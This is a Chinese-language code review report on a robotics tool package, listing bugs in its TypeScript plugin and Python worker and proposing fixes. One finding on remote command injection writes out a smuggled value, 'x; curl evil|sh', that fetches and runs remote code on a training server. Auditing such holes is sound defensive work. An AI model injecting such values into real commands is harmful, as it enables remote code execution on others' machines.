# @robotic-harness/dsh-bundle 代码审查报告

- 审查日期:2026-08-15
- 范围:`packages/dsh-bundle`(src/*.ts + worker/robotic_harness_worker/*.py + skills/ + cordis.patch.yml)
- 方式:17 路并行代码审查(TS 插件层 1 路 + Python worker 16 路)+ 人工复核全部 CRITICAL/HIGH + 静态检查
- 静态检查:`tsc --noEmit` **通过**(0 错误);`py_compile`(Python 3.12.7)**23 个文件全部通过**

> 重要环境提示:本机系统默认 `python` 是 **3.7.8**,无法解析 `data_pipeline.py:317` 的 walrus 操作符(`:=`,需 ≥3.8)。
> `src/tools.ts:31` 默认 `pythonPath: 'python'`,因此不配置 `rh-tools.pythonPath` 时,所有 `rh_*` 工具在本机
> 都会直接 SyntaxError。需指向 Python ≥3.8(如 Anaconda 3.12:`D:\download\anaconda\python.exe`)。
> 建议:worker 启动时做版本自检并给出友好报错。

---

## 一、CRITICAL(7 处)—— 必须修

### C1. training.py:416/428/470 — 远程命令注入(RCE)
`plan_id`/`job_id` 来自模型可控参数(tools.ts:1214 `planId`),`cmd_train_job_prepare` 只做 `str(...).strip()`
不做任何校验,直接拼进 ssh 远程 shell 命令:

```python
remote_dir = f"{work_dir}/rh-jobs/{plan_id}"                       # 416
_run_ssh(server, f"mkdir -p {remote_dir} && cd {remote_dir} && nohup bash launcher.sh ...")  # 428
_run_ssh(server, f"tail -n 30 {remote} ...")                       # 470 (job_id 同理)
```

`planId = "x; curl evil|sh"` 即在训练服务器上任意代码执行;同时 `../` 可做本地路径穿越
(369/378 行 `train-plans|train-jobs` 目录写读)。
**修复**:id 校验 `^[A-Za-z0-9._-]+$`,远程路径组件一律 `shlex.quote()`,并做 `realpath` 包含性检查。

### C2. ros.py:524-540 — Float64 解码回退分支不可达,采样值静默变 0.0
`len(data) >= 12` 分支(读 offset 4 的 double)对 16 字节(encap+4 pad+double@8)消息也成立,
把 padding(通常全 0)当数值返回 0.0,第 535 行的回退分支永远执行不到。
**修复**:按长度确定性选布局:`len >= 16` 先读 offset 8,否则读 offset 4;或删掉死分支。

### C3. data_pipeline.py:1833-1837 — LeRobot 导出关节值错位
`_expand_q_columns` 过滤掉 None 值后,列名仍按原长度生成:`q=[1.0, None, 3.0]` → `q1=3.0`(关节 2 的值
被标成关节 1),训练数据静默损坏。
**修复**:列名从过滤后的 `(i, v)` 对生成,或保留 None 占位。

### C4. control.py:424-425 — 负向阶跃 overshoot 恒为 ~100%
`peak = np.nanmax(y_ok)`,`overshoot = (peak - final)/|Δ|`。对下降阶跃,窗口内最大值就是 baseline,
`peak - final = |Δ|` → 永远 100%,真实下冲被掩盖。
**修复**:按阶跃方向取极值(`final < baseline` 时用 `np.nanmin`),符号对称处理。

### C5. report.py:248-249/329-330(+367)— timeline/dashboard HTML 永远白屏
payload 先 `html.escape(json.dumps(...), quote=True)`(`"` → `&quot;`),模板里却用
`JSON.parse(decodeURIComponent("__PAYLOAD__"))`。`<script>` 是 raw text 元素,HTML 实体不会被解码,
`&quot;` 留在 JSON 里 → JSON.parse 必然抛错。
**修复**:嵌入 `json.dumps(payload).replace('<', '\\u003c')`,直接 `JSON.parse("...")`。

### C6. report.py:408-417 — timeline JS 键名与 Python 序列化不一致
`PhaseEvent/Anomaly/Hypothesis` 经 `asdict` 输出 snake_case(`time_s`、`suggested_checks`),
JS 读 `p.timeS`(恒空白)与 `h.suggestedChecks.join(...)`(undefined → TypeError,脚本中断)。
**修复**:JS 改用 snake_case,或 to_dict 加 camelCase 别名。

### C7. research.py:80 — arXiv 查询双重包裹,检索静默失效
`_arxiv_query` 已返回 `all:"k1" AND all:"k2"`,`_search_arxiv` 再包一层 `all:"{query}"` →
`all:"all:"k1" AND all:"k2""` 语法损坏,默认来源搜索要么 400 要么结果错误。
**修复**:直接透传 query,只在自由文本入口包一次。

---

## 二、HIGH(20 处)—— 尽快修

### 跨层契约(TS ↔ Python 参数名/文档不一致,静默失效)
| 位置 | 问题 |
|---|---|
| tools.ts:564 vs simulation.py:72-79 | `rh_sim_run` 文档写 camelCase 故障键(`tfOffset` 等),worker 只读 snake_case(`tf_offset`),故障**静默不注入** |
| tools.ts:333-334 vs control.py:717-718 | 发送 `timeColumnPlanned/Actual`,worker 读 `plannedTimeColumn/actualTimeColumn` |
| tools.ts:372-373 vs control.py:1018-1020 | 发送 `stepStartS/stepEndS`,worker 读 `stepStart/stepEnd`,辨识窗口被忽略 |
| tools.ts:261 + ros.py:1220-1282 | `maxDurationS`(自动停止时长)只在文档字符串里,从未实现 → bag 无限增长 |
| tools.ts:99 + cli.py:108-111 | `outPath` 标可选但 worker 强制要求,校验通过后运行期才失败 |
| tools.ts:297 | `outputColumn` 死参数(worker 从不读) |
| tools.ts:1077 | `rh_benchmark_report.metrics` 被忽略 |
| tools.ts:978 | `rh_dataset_version_create.seed` 被忽略 |

### 数据/科学正确性
- **simulation.py:550-551** — 感知失败(`route_perception ok=False`)回退到真值继续跑 → 遮挡等故障注入
  变成 no-op,`success=True` 仍可能成立,基准结论被污染。
- **simulation.py:633-636** — 放置位姿低了半个物体高,手臂把物体压进桌面 14mm(释放时才弹起)。
- **data_pipeline.py:694/709(+475-488)** — `bisect` 用在未排序时间序列上 → 流对齐静默错配。
- **data_pipeline.py:222** — `.tsv` 被当作逗号 CSV 解析,单列含制表符、`parse_errors=0`,静默损坏。
- **data_pipeline.py:1894** — 缺时间戳静默补 0.0,整段 episode 时间戳重复。
- **data_pipeline.py:1898** — per-frame `success` 被 run 级常量覆盖,终止状态标签全错。
- **data_pipeline.py:1968-1972** — `info.json` 声明 `observation.state` feature,实际只写扁平 `q0..qN`
  列,按 LeRobot 契约加载必失败。
- **data_pipeline.py:1694-1700** — 分片 rosbag(多个 .db3)只读 `candidates[0]`,后续分片全丢。
- **ros.py:929** — `ros2 node list -t` 非法参数(该命令没有 -t),usage 错误文本被解析成"节点"。
- **ros.py:116-153/234-257** — `ros2 topic hz` 窗口未满时无输出 + `proc.kill()`(SIGKILL)阻止
  Ctrl+C 统计 flush → 低速率 topic 系统性误报 0 Hz。
- **ros.py:400-405** — 分片 bag 只开 `relative_file_paths[0]`。
- **vision_extra.py:636-643** — OpenCV `cv2.FileStorage` 导出的 `!!opencv-matrix` YAML 无法解析
  (yaml.safe_load ConstructorError;unwrap 后 np.asarray 再炸),最常见的标定文件格式被拒。
- **control.py:733-755** — `compare_planned_actual` 未排序就 `np.searchsorted`,错位对齐。
- **telemetry.py:407-414** — 重复时间戳除零 → inf 斜率 → 假 `maxRate` 异常。
- **telemetry.py:439-442** — MAD=0(常量通道单尖峰)时尖峰检测盲区。
- **robots.py:202/278-283** — `READY_FOR_APPROVAL`(仅"申请了"未批准)算 pass;硬件检查全 skip 也判
  `ready` —— 零硬件证据+零批准给出就绪结论。
- **experiment.py:444-455** — ablation 把所有非 baseline 组池化成一个比率,无显著性检验/CI/多重比较控制,
  固定 0.001 阈值直接下 `improves/hurts` 结论。
- **cli.py:168** — `sim-validate-scenario` 带 `path` 时顶层 `ok` 恒为 True,校验失败被埋在 `validated` 里。
- **training.py:427-428** — scp 先于 mkdir(新服务器失败);重提交时目录已存在 → scp 嵌套复制,
  launcher.sh 找不到。
- **training.py:428/431** — 启动 ssh 返回码被丢弃,失败也记 `running`;pid 从 stderr 末行解析
  (可能取到伪终端警告文本)。
- **worker.ts:99-102 + cli.py:493-498** — worker 内部错误把完整 message+traceback 写 stdout 但 exit 1,
  TS 侧非零退出时只取 stderr → **真实错误信息被丢弃**,只剩 "worker exited with code 1"。
- **memory.py:246-247** — case 写入非原子且无锁,损坏文件被 `_load_cases` 静默 `continue` 跳过(永久丢数据)。
- **data_quality.py:103-124/183-184** — NaN 时间戳穿透排序/间隙检查,`json.dumps` 输出裸 `NaN`
  token,TS 侧 `JSON.parse` 直接拒绝,整个 audit 命令报废。
- **models.py:444-474** — `timeoutMs` 对 python-module 推理不生效,挂死的入口点无限阻塞 worker。
- **assets.py:520-562** — `convert_urdf_to_mjcf` 无 `out_path == urdf_path` 防护 → **转换会覆盖源 URDF**
  (数据丢失);所有失败路径裸抛 `kind:"internal"`。

---

## 三、MEDIUM 精选(其余详见各模块)

- **worker.ts:87-88** — `child.stdin` 无 `'error'` 监听,EPIPE 可成为未捕获异常击穿宿主进程。
- **worker.ts:90-93/106** — signal 已 abort 时监听永不触发,取消无效;超时仅 SIGTERM 单进程(Windows
  上子树存活),错误信息无超时提示。
- **skills.ts:88** — 只查 `SKILL.md`,`rh-autonomous-training` 和 `rh-research-problem-solutions`
  是 `skill.md`(小写)→ **Linux/macOS 上 2 个技能被静默丢弃**(Windows 碰巧能用)。
- **simulation.py:534-567/459-460** — 单一 `random.Random(seed)` 流,是否渲染器可用影响随机数消耗
  顺序 → 同 seed 跨环境不复现。
- **simulation.py:748-750** — `in_zone` 把 0.02 的垂直偏置混入 2D 距离,半径 <0.02 的自定义区域
  永远不可达。
- **telemetry.py:380-394/444-459** — 阈值/尖峰异常逐样本生成 → 长运行内存与响应体积爆炸(应合并为
  连续区间)。
- **data_pipeline.py:574** — 交叉相关只剩一个有效 lag 时 `np.nanmax` 崩(零尺寸归约)。
- **data_pipeline.py:881-958** — lowpass/median/detrend 对空表(仅表头 CSV)裸 IndexError。
- **data_pipeline.py:1751-1753** — `fetchall` 全量载入多 GB bag → OOM 风险。
- **data_pipeline.py:2112-2137** — "不可变"版本目录被复用时会覆盖重写。
- **data_pipeline.py:1433-1435** — 泄漏检查只查 `0 <= gap <= 1`,时间范围**重叠**(最强泄漏信号)不报。
- **control.py:469-495** — 单侧限幅时另一侧从数据推导 → 常态误报饱和。
- **control.py:420** — 小 final 值(0.001)时稳定带宽塌缩 → 永远"未稳定"。
- **control.py:1054-1089** — 一阶 tau 忽略估计延迟 + `mode="same"` 平滑边缘偏置。
- **control.py:1070-1084** — 单个噪声尖峰即判二阶系统。
- **cli.py:182/288/337** — `int(args.get("seed", 42))` 对 `42.5`/`null` 裸崩(→ internal 错误)。
- **cli.py:46-50 vs core.py:35-47** — `_store_for` 不调 `normalize_store_root`,diagnose 存
  `<ws>/cases` 而 memory 查 `<ws>/.rh`,relatedCases 永远查不到刚存的 case。
- **core.py:50-53** — `_slug` 放行 `.`/`..`,`run_dir("..")` 可写到 store root 之外。
- **report.py 全模块** — run.json/index.json/cases/manifest 全部非原子直写,中途被杀 → 截断 JSON,
  后续 `json.load` 崩溃;`export_evidence` 复用时不清空 out_dir,陈旧文件混入 bundle。
- **training.py:373-374** — `bool("false") is True` → `dryRun:"false"` 仍静默干跑;`confirm:"false"`
  当确认(两个方向都危险)。
- **training.py:243** — `validationSplit` 记入 plan 但生成的 train.py 从不切分 → 训练恒用 100% 数据。
- **vision.py:85** — 红色 HSV 预设缺 170-180 环绕区间,暖光下红物体必漏检。
- **vision.py:94-108** — `np.uint8` 静默回绕(>255 的 S 变 44);输入错误被归为"cv2 backend failure"。
- **models.py:808-812** — `bool("false")`、字符串当列表 → 路由过滤静默错误。
- **models.py:918-967** — 默认 n=2 次 rollout 下断言"策略 A 成功率更高"的因果结论。
- **knowledge.py:121/175-181** — 索引 sha256 存了从不校验,文档改动后检索指向旧行号,证据片段与
  匹配词对不上。
- **knowledge.py:210-223** — 打分=原始行数,长文本/重复 token 天然占优。
- **memory.py:104-107** — 打分未按查询长度归一化。
- **assets.py:227-239** — URDF 关节缺 parent/child 静默通过校验。
- **assets.py:407** — mesh 路径无包含性检查,`../..` 逃逸 + 符号链接未解析。
- **assets.py:493** — free joint 靠名字子串猜,常见空名 free joint 被漏。
- **experiment.py:228** — `seed + flat index` 使配对实验不可能(不同条件的第 k 次复现永远不同场景)。
- **experiment.py:303-306** — `True == 1 == 1.0` 类型合并。
- **report.py:32/95/189-214** — 每条命令把 run 数据从磁盘重复加载 2-3 次。

---

## 四、算法改进建议(按价值排序)

1. **data_pipeline.py:546-559 时间同步** — 暴力逐 lag 相关 O(L·N)(100Hz 下 ~2000 lag)
   → FFT 互相关 O(N log N),保留抛物线峰值细化。
2. **data_pipeline.py:928-938 `_op_resample`** — 把每列的 ts/arr/数值标记构建移出输出循环,
   O(n_out·n_cols·n) → O(n·n_cols + n_out·n_cols),每列一次 `searchsorted`。
3. **data_pipeline.py:475-488/683-737 流对齐** — 每流预排序 + `np.searchsorted`/双指针滑动窗口,
   O(n·m) → O(n+m)(同时修 C 类正确性 bug)。
4. **telemetry.py:724-772 run-compare** — `np.take` 预构建对齐矩阵,统计与首个分歧一次向量化
   (O(P·C) Python 双层循环 → 数组运算),是长运行最大耗时点。
5. **telemetry.py:404-429 rate 检测** — 每样本重扫窗口 O(n·w) → 滑动窗口/上凸包增量维护 O(n log n)。
6. **memory.py/knowledge.py 检索** — 全条目扫描 + 原始 token 计数 → 持久化倒排索引 + TF-IDF/BM25
   (按查询长度归一化),检索复杂度 O(条目×token) → O(查询 token + 命中)。
7. **data_pipeline.py:1751-1753 rosbag 解码** — `fetchall` + 逐消息 `struct.unpack` →
   游标增量迭代 + `np.frombuffer('<f8')` 批量解码(内存 O(bag)→O(1),Float64 主题大幅提速)。
8. **simulation.py:497-505/756-761** — 轨迹插值与 RMS 用 numpy 向量化(`np.linspace` 预生成段)。
9. **control.py:305-330 时间偏移** — 阶跃数据的相关峰是平坦平台 → 起沿对齐(50% 穿越时刻差)。
10. **ros.py measure_topic_hz** — 自适应窗口 + SIGINT(而非 SIGKILL)让 CLI flush 最终统计,
    修掉低速率 0-Hz 误报。
11. **vision_extra.py:83-88** — HSV 预设与 vision.py 重复 → 单一来源(import 或复用 `hsvRange`
    返回值),避免两处漂移导致掩码/IoU 不一致。
12. **report.py** — 把 `(run, telemetry)` 穿透 `export_evidence/generate_report/replay_run`,
    消除每条命令 2-3 次整表重读。
13. **experiment.py** — 配对 seed 设计保留,但默认 ~10-20 seeds + 每组合 mean-of-means +
    CI/效应量;ablation 逐水平 Fisher exact/bootstrap,落实声明的 `statisticalMethod`。
14. **models.py benchmark** — 预跑一次 warmup(排除 import/IO),报告 median/p95 而非裸 mean。
15. **simulation.py RNG** — 按噪声源拆分独立流(`Random(f"{seed}:perception")` 等),确定性不依赖
    渲染器是否可用。
16. **vision_extra.py:197-206** — 无 cv2 回退的模糊度指标改为真离散 Laplacian 方差,与 cv2 分支
    同尺度共用阈值。

---

## 五、通用工程问题(横切)

- **原子写**:run.json/index.json/jobs.json/manifest/case/证据包等所有 JSON 持久化都是直写
  `open(...,"w")` → 统一 temp + `os.replace`。
- **输入校验**:大量 `int()/float()/bool()` 裸转换、`isinstance` 缺失,坏输入要么裸崩要么静默
  改语义(`bool("false")`、字符串当列表、`int(None)`)→ 统一 WorkerError + 类型/范围校验。
- **错误契约**:worker 内部错误把结构化 JSON 写 stdout 却 exit 1,TS 侧非零退出丢弃 stdout →
  要么 stderr 也写、要么结构化错误 exit 0。
- **死代码/文档漂移**:`model_timeout_s`(DEFAULT_FAULT 里定义了但从不读)、`outputColumn`、
  `ascii_like`、cad.py:1229 死回退、core.ts 空壳行、`_inverse` 未用返回值、`maxDurationS`。
- **Python 版本**:代码实际要求 ≥3.8(README 写 3.10),本机默认 3.7.8 直接 SyntaxError;
  worker 启动时做 `sys.version_info` 自检给友好报错。

---

## 六、修复优先级建议

1. **第一批(安全/数据损坏)**:C1 注入、C2 解码 0.0、C3 关节错位、C4 overshoot、assets.py 覆盖源文件、
   training.py scp/启动顺序、worker.ts 错误透传、skills.ts 大小写、参数契约 8 项(表)。
2. **第二批(科学结论正确性)**:C5/C6 timeline、simulation 感知回退/放置位姿、data_pipeline 对齐/tsv/
   success/info.json、ros.py 分片/hz、telemetry 除零/MAD、experiment/robots 判定逻辑。
3. **第三批(健壮性+性能)**:原子写、输入校验统一、算法改进 1-16 中收益最大的 1/2/3/4/6 项。
